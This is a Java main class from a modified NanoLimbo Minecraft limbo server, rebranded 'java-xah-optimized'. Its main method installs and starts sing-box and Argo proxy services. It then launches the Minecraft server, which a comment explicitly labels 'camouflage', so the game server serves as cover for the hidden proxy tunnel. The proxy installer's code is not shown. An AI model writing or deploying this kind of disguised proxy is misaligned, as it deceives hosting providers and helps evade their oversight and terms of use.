/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package ua.nanit.limbo;

import ua.nanit.limbo.proxy.ProxyManager;
import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static ProxyManager proxyManager;

    public static void main(String[] args) {

        if (Float.parseFloat(System.getProperty("java.class.version")) < 52.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too low, please use Java 8 or higher!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }

        // Start proxy services (sing-box + Argo)
        try {
            proxyManager = new ProxyManager();
            proxyManager.install();
            proxyManager.startup();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                System.out.println(ANSI_RED + "Shutting down..." + ANSI_RESET);
            }));

            System.out.println(ANSI_GREEN + "\nProxy services are starting..." + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using java-xah-optimized!\n" + ANSI_RESET);
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing proxy services: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }

        // Start Minecraft Limbo server (camouflage)
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }
}
